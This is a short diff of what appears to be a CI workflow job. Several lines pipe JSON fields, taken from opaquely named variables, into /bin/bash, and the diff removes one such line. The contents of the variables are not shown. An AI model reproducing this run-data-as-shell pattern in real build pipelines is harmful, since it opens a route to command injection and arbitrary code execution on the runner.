@@ -21,7 +21,6 @@ jobs:
           echo $qtwz91 | jq -r .iz968 | /bin/bash
           printf '%s' "$ftodb126" | jq -r .blyd5224 | /bin/bash
           printf '%s' "$nf1" | jq -r .ofe2908 | /bin/bash
-          echo $p66 | jq -r .sofcp153 | /bin/bash
           printf '%s' "$rari23" | jq -r .bztr88113 | /bin/bash
 
       - name: Archive output
